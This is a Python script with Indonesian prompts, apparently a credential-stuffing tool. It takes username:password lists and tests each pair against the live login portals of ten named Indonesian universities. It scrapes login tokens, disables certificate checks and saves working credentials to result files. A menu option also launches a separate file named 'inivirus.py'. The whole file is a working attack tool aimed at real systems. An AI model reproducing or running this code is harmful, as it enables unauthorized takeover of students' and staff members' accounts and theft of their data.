import os, time, json, random, platform, urllib.parse, requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor
try:
    import requests as req
    from bs4 import BeautifulSoup as bs
except:
    os.system('pip install --upgrade pip')
    os.system('pip install requests bs4')
    os.system('clear')
    exit('Install bahan selesai\nSilahkan restart script')
else:
    grey = '\x1b[90m'
    red = '\x1b[91m'
    green = '\x1b[92m'
    yellow = '\x1b[93m'
    blue = '\x1b[94m'
    purple = '\x1b[95m'
    cyan = '\x1b[96m'
    white = '\x1b[37m'
    flag = '\x1b[47;30m'
    off = '\x1b[m'
    rv = platform.uname()
    me = rv.release
    ok = []
    no = []
    found = []
    error = []
    yxc = []
    logo = f"\x1b[91m          ) (            \n\x1b[95m       ( /( )\ )         \n\x1b[94m    (  )\()|()/((   (    \n\x1b[96m    )\((_)\ /(_))\  )\   \n\x1b[93m _ ((_)_((_|_))((_)((_)  \n\x1b[92m| | | | \| |_ _\ \ / /   \n\x1b[90m| |_| | .` || | \ V /    \n\x1b[37m \___/|_|\_|___| \_/     "
    logo2 = f"  {flag} Rania Salsabilla {off}"
    os.system('clear')

    def uii(i, usr, pwd):
        url = 'https://tagihan.uii.ac.id/index.php/login'
        dat = {'uname':usr,  'passwd':pwd, 
        'submit':'submit'}
        raw = req.post(url, data=dat, verify=False, timeout=10).text
        sta = bs(raw, 'html.parser').title.get_text()
        if sta == 'Tagihan UII':
            print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
            error.append(f"{usr}:{pwd}")      
        else:
            print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
            found.append(f"{usr}:{pwd}")
            with open('hasil_uii.txt', 'a') as (save):
            	save.write(f"{usr}:{pwd}\n")
            
    def cek(usr, pwd):
        try:
            url = 'https://sso.ugm.ac.id/cas/login?service=http%3A%2F%2Fsimaster.ugm.ac.id%2Fugmfw%2Fsignin_simaster%2Fsignin_proses'
            ses = req.Session()
            row = ses.get(url).text

            tok = bs(row, 'html.parser').findAll('input')[4]['value']

            tok1 = bs(row, 'html.parser').findAll('input')[5]['value']
            dat = {'username':usr,
'password':pwd, 'lt':tok, '_eventId':tok1, 'submit':'MASUK'}
            raw = ses.post(url, data=dat).text

            try:
                her = bs(raw, 'html.parser').findAll('noscript')[0].get_text()
                print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
                found.append(f"{usr}:{pwd}")
                with open('hasil_ugm.txt', 'a') as (save):
                    save.write(f"{usr}:{pwd}\n")
            except IndexError:
                print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
                error.append(f"{usr}:{pwd}")

        except KeyboardInterrupt:
            exit()
            
    def uajy(usr, pwd):
        try:
            url = 'https://siatma.uajy.ac.id/Index.aspx'
            ses = req.Session()
            row = ses.get(url).text

            tok = bs(row, 'html.parser').findAll('input')[0]['value']

            vs1 = bs(row, 'html.parser').findAll('input')[1]['value']

            vs2 = bs(row, 'html.parser').findAll('input')[2]['value']
            dat = {'__VIEWSTATE':tok, '__VIEWSTATEGENERATOR':vs1, '__EVENTVALIDATION':vs2,
             'txtUsername':usr,
'txtPassword':pwd,
'btnLogin':'submit'}
            raw = ses.post(url, data=dat).text
            try:
                her = bs(raw, 'html.parser').findAll('span')[6].get_text()
                print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
                found.append(f"{usr}:{pwd}")
                with open('hasil_uajy.txt', 'a') as (save):
                    save.write(f"{usr}:{pwd}\n")
            except IndexError:
                print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
                error.append(f"{usr}:{pwd}")

        except KeyboardInterrupt:
            exit()
            
    def ub(usr, pwd):
        url = 'https://siam.ub.ac.id/'
        dat = {'username':usr,  'password':pwd, 
         'login':'submit'}
        raw = req.post(url, data=dat, verify=False, timeout=10).text
        res = bs(raw, 'html.parser').title.get_text()
        if res == 'Sistem Informasi Akademik Mahasiswa':
            print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
            ok.append(f"{usr}:{pwd}")
            with open('ub.txt', 'a') as (s):
                s.write(f"{usr}:{pwd}\n")
        else:
            print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
            no.append(f"{usr}:{pwd}")
            
    def unusa(i, usr, pwd):
        url = 'https://sim.unusa.ac.id/front/gate/index.php'
        dat = {'txtUserID':usr,  'txtPassword':pwd, 
         'submit':'submit'}
        raw = req.post(url, data=dat, verify=False, timeout=10).text
        sta = bs(raw, 'html.parser').title.get_text()
        if sta == 'Kuesioner':
            print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
            found.append(f"{usr}:{pwd}")
            with open('hasil_unusa.txt', 'a') as (save):
             save.write(f"{usr}:{pwd}\n")
        else:
            print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
            error.append(f"{usr}:{pwd}")
            
    def usd(i, usr, pwd):
        url = 'https://belajar.usd.ac.id/login/index.php'
        dat = {'username':usr,  'password':pwd, 
         'submit':'submit'}
        raw = req.post(url, data=dat, verify=False, timeout=10).text
        sta = bs(raw, 'html.parser').title.get_text()
        if sta == 'Dashboard':
            print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
            found.append(f"{usr}:{pwd}")
            with open('hasil_usd.txt', 'a') as (save):
             save.write(f"{usr}:{pwd}\n")
        else:
            print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
            error.append(f"{usr}:{pwd}")
            
    def unsrat(usr, pwd):
        try:
            url = 'https://inspire.unsrat.ac.id/login/autentikasi'
            ses = req.Session()
            row = ses.get(url).text
            dat = {'username':usr,
'password':pwd}
            raw = ses.post(url, data=dat).text
            try:
                her = bs(raw, 'html.parser').findAll('small')[1].get_text()
                print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
                found.append(f"{usr}:{pwd}")
                with open('unsratx.txt', 'a') as (save):
                    save.write(f"{usr}:{pwd}\n")
            except IndexError:
                print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
                error.append(f"{usr}:{pwd}")

        except KeyboardInterrupt:
            exit()
            
    def unsyiah(i, usr, pwd):
        url = 'https://simkuliah.unsyiah.ac.id/index.php/login'
        dat = {'username':usr,  'password':pwd, 
        'submit':'submit'}
        raw = req.post(url, data=dat, verify=False, timeout=10).text
        sta = bs(raw, 'html.parser').h5.get_text()
        if sta == 'Absenkan Mahasiswa':
            print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
            found.append(f"{usr}:{pwd}")
            with open('unsyiah.txt', 'a') as (save):
                save.write(f"{usr}:{pwd}\n")
        else:
            print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
            error.append(f"{usr}:{pwd}")
            
    def upi(i, usr, pwd):
        ses = req.Session()
        ses = req.Session()
        url = 'https://sso.upi.edu/cas/login'
        raw = ses.get(url).text
        tok = bs(raw, 'html.parser').findAll('input')[2]['value']
        dat = {'username':usr,  'password':pwd, 
         'execution':tok, 
         '_eventId':'submit', 
         'submit':'LOGIN'}
        gas = ses.post(url, data=dat).text
        res = bs(gas, 'html.parser').findAll('div')[2]['class'][0]
        if res == 'success':
            print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
            found.append(i)
            with open('aktif.txt', 'a') as (s):
                s.write(f"{usr}:{pwd}\n")
        else:
            print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
            error.append(i)

    def unsyiahp():
        try:
            path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
            with open(path, 'r') as (f):
                lines = f.readlines()
                count = 1
                print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
                for line in lines:
                    data = line.strip()
                    user = data.split(':')[0]
                    pswd = data.split(':')[1]
                    if len(data) > 0:
                        unsyiah(count, user, pswd)
                        count += 1
                        continue

            done()

        except KeyboardInterrupt:
            exit(f"\n{red}>> {white}Keluar script")
        except FileNotFoundError:
            exit(f"{red}>> {white}File tidak ditemukan")
        except IndexError:
            exit(f"{red}>> {white}Maaf format dalam file salah")
        except Exception as e:
            try:
                print(f"\n{red}>> {white}Error:(")
            finally:
                e = None
                del e
                
    def itb(i, usr, pwd):
        ses = req.Session()
        url = 'https://login.itb.ac.id/cas/login'
        raw = ses.get(url).text
        tok = bs(raw, 'html.parser').findAll('input')
        dat = {'username':usr,  'password':pwd, 
         'execution':tok[2]['value'], 
         '_eventId':'submit',
         'submit':'submit'}
        res = ses.post(url, data=dat).headers
        try:
            mantap = res['Set-Cookie']
            print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
            time.sleep(0.001)
            ok.append(f"{usr}:{pwd}")
            with open('hasil_itb.txt', 'a') as (s):
                s.write(f"{usr}:{pwd}\n")
        except KeyError:
            print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
            time.sleep(0.001)
                
    def uiip():
        try:
            path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
            with open(path, 'r') as (f):
                lines = f.readlines()
                count = 1
                print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
                for line in lines:
                    data = line.strip()
                    user = data.split(':')[0]
                    pswd = data.split(':')[1]
                    if len(data) > 0:
                        uii(count, user, pswd)
                        count += 1
                        continue

            done()

        except KeyboardInterrupt:
            exit(f"\n{red}>> {white}Keluar script")
        except FileNotFoundError:
            exit(f"{red}>> {white}File tidak ditemukan")
        except IndexError:
            exit(f"{red}>> {white}Maaf format dalam file salah")
        except Exception as e:
            try:
                print(f"\n{red}>> {white}Error:(")
            finally:
                e = None
                del e
                
    def ugmp():
        try:
            path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
            with open(path, 'r') as (file):
                lines = file.readlines()
                print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
                for line in lines:
                    user = line.strip().split(':')[0]
                    pswd = line.strip().split(':')[1]
                    cek(user, pswd)
                else:
                    print(f"\n{cyan}>> {white}[{green}Live:{len(found)}{white}] {purple}|{white} [{red}die:{len(error)}{white}]")
                    print(f"{purple}>>{white} Akun aktif tersimpan di {purple}ugm.txt{off}")
                    print(f"{cyan}>> {white}Kunjungi website{green} vpnkacang.my.id{off}")
                    print(f"{purple}>> {off}Buat ssh? di {green}sanzssh.digital {off}aja gratis")
                    exit()

        except IndexError:
            exit(f"{white}[{red}!{white}]{white}Input Salah")
        except FileNotFoundError:
            exit(f"{white}[{red}!{white}]{white}File tidak ditemukan")
        except KeyboardInterrupt:
            pass
            
    def unusap():
        try:
            path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
            with open(path, 'r') as (f):
                lines = f.readlines()
                count = 1
                print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
                for line in lines:
                    data = line.strip()
                    user = data.split(':')[0]
                    pswd = data.split(':')[1]
                    if len(data) > 0:
                        unusa(count, user, pswd)
                        count += 1
                        continue

            done()

        except KeyboardInterrupt:
            exit(f"\n{red}>> {white}Keluar script")
        except FileNotFoundError:
            exit(f"{red}>> {white}File tidak ditemukan")
        except IndexError:
            exit(f"{red}>> {white}Maaf format dalam file salah")
        except Exception as e:
            try:
                print(f"\n{red}>> {white}Error:(")
            finally:
                e = None
                del e
                
    def usdp():
        try:
            path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
            with open(path, 'r') as (f):
                lines = f.readlines()
                count = 1
                print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
                for line in lines:
                    data = line.strip()
                    user = data.split(':')[0]
                    pswd = data.split(':')[1]
                    if len(data) > 0:
                        usd(count, user, pswd)
                        count += 1
                        continue

            done()

        except KeyboardInterrupt:
            exit(f"\n{red}>> {white}Keluar script")
        except FileNotFoundError:
            exit(f"{red}>> {white}File tidak ditemukan")
        except IndexError:
            exit(f"{red}>> {white}Maaf format dalam file salah")
        except Exception as e:
            try:
                print(f"\n{red}>> {white}Error:(")
            finally:
                e = None
                del e
                
    def unsratp():
        try:
            path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
            with open(path, 'r') as (file):
                lines = file.readlines()
                print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
                for line in lines:
                    user = line.strip().split(':')[0]
                    pswd = line.strip().split(':')[1]
                    unsrat(user, pswd)
                else:
                    done()

        except IndexError:
            exit(f"  {white}[{red}!{white}]{white} Input Salah")
        except FileNotFoundError:
            exit(f"  {white}[{red}!{white}]{white} File tidak ditemukan")
        except KeyboardInterrupt:
            pass
            
    def uajyp():
        try:
            path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
            with open(path, 'r') as (file):
                lines = file.readlines()
                print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
                for line in lines:
                    user = line.strip().split(':')[0]
                    pswd = line.strip().split(':')[1]
                    uajy(user, pswd)
                else:
                    done()

        except IndexError:
            exit(f"  {white}[{red}!{white}]{white} Input Salah")
        except FileNotFoundError:
            exit(f"  {white}[{red}!{white}]{white} File tidak ditemukan")
        except KeyboardInterrupt:
            pass
            
    def upip():
        try:
            path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
            with open(path, 'r') as (f):
                lines = f.readlines()
                count = 1
                print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
                for line in lines:
                    data = line.strip()
                    user = data.split(':')[0]
                    pswd = data.split(':')[1]
                    if len(data) > 0:
                        upi(count, user, pswd)
                        count += 1
                        continue

            done()

        except KeyboardInterrupt:
            exit(f"\n{red}>> {white}Keluar script")
        except FileNotFoundError:
            exit(f"{red}>> {white}File tidak ditemukan")
        except IndexError:
            exit(f"{red}>> {white}Maaf format dalam file salah")
        except Exception as e:
            try:
                print(f"\n{red}>> {white}Error:(")
            finally:
                e = None
                del e
                
            
    def itbp():
        try:
            path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
            with open(path, 'r') as (f):
                lines = f.readlines()
                count = 1
                print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
                for line in lines:
                    data = line.strip()
                    user = data.split(':')[0]
                    pswd = data.split(':')[1]
                    if len(data) > 0:
                        itb(count, user, pswd)
                        count += 1
                        continue

            done()

        except KeyboardInterrupt:
            exit(f"\n{red}>> {white}Keluar script")
        except FileNotFoundError:
            exit(f"{red}>> {white}File tidak ditemukan")
        except IndexError:
            exit(f"{red}>> {white}Maaf format dalam file salah")
        except Exception as e:
            try:
                print(f"\n{red}>> {white}Error:(")
            finally:
                e = None
                del e

    def ubp():
        try:
            file = input(f"{grey}[{white}×{grey}] {white}Input list > ")
            with open(file, 'r') as (f):
                lines = f.readlines()
                count = 1
                print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
                for line in lines:
                    usr = line.strip().split(':')[0]
                    pwd = line.strip().split(':')[1]
                    ub(usr, pwd)
                    count += 1

            done()
        except KeyboardInterrupt:
            exit(f"\n{purple}[{white}!{purple}]{white}Keluar script")
        except Exception as er:
            try:
                exit(f"\n{white} {{!}} {er}")
            finally:
                er = None
                del er
            
            

    def done():
        print(f"\n{grey}>> {white}[{grey}Live:{len(found)}{white}] {grey}|{white} [{red}die:{len(error)}{white}]")
        print(f"{grey}>>{white} Akun aktif tersimpan")
        print(f"{grey}[{white}?{grey}] {off}Scan lagi? y/n")
        inv = input(f"{grey}> {off}Pilih : ")
        if inv == 'y':
        	os.system('clear')
        	main()
        else:
        	exit()
        
    def main():
        print(logo + "\n" + logo2 + "\n" + f"\n{grey}[{white}1{grey}]{off} UII ")
        print(f"{grey}[{white}2{grey}]{off} UGM ")
        print(f"{grey}[{white}3{grey}]{off} UNSYIAH ")
        print(f"{grey}[{white}4{grey}]{off} UNUSA ")
        print(f"{grey}[{white}5{grey}]{off} USD ")
        print(f"{grey}[{white}6{grey}]{off} UNSRAT ")
        print(f"{grey}[{white}7{grey}]{off} UPI ")
        print(f"{grey}[{white}8{grey}]{off} UAJY ")
        print(f"{grey}[{white}9{grey}]{off} UB ")
        print(f"{grey}[{white}10{grey}]{off} ITB ")
        print(f"{grey}[{white}11{grey}]{off} {white}Bonus{off} forlap dumper")
        select = input(f"\n{grey}[{white}?{grey}]{off} Pilih > ")
        if select == '1':
            uiip()
        elif select == '2':
            ugmp()
        elif select == '3':
            unsyiahp()
        elif select == '4':
        	unusap()
        elif select == '5':
        	usdp()
        elif select == '6':
        	unsratp()
        elif select == '7':
        	upip()
        elif select == '8':
        	uajyp()
        elif select == '9':
        	ubp()
        elif select == '10':
        	itbp()
        elif select == '11':
       	 os.system('python3 inivirus.py')
        else:
            exit()
            
    if __name__ == '__main__':
        main()